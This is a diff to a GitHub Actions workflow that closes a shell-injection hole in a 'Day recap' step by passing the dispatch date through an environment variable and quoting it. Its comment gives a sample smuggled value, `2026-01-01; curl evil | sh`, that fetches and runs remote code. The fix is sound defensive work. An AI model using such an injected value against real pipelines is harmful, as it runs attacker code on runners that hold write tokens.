@@ -28,9 +28,16 @@ jobs:
         with:
           node-version: 20
       - name: Day recap
+        # Pass the dispatch input via env, never interpolated into the shell:
+        # `${{ inputs.date }}` splices before the shell runs, so an unquoted value
+        # like `2026-01-01; curl evil | sh` would execute on a runner holding
+        # contents:write + GH_BOT_TOKEN. As "$DATE" it stays a single argument and
+        # the script's own YYYY-MM-DD validation is what gates it.
+        env:
+          DATE: ${{ inputs.date }}
         run: |
-          if [ -n "${{ inputs.date }}" ]; then
-            node scripts/gen-day-recap.mjs --date=${{ inputs.date }}
+          if [ -n "$DATE" ]; then
+            node scripts/gen-day-recap.mjs --date="$DATE"
           else
             node scripts/gen-day-recap.mjs
           fi
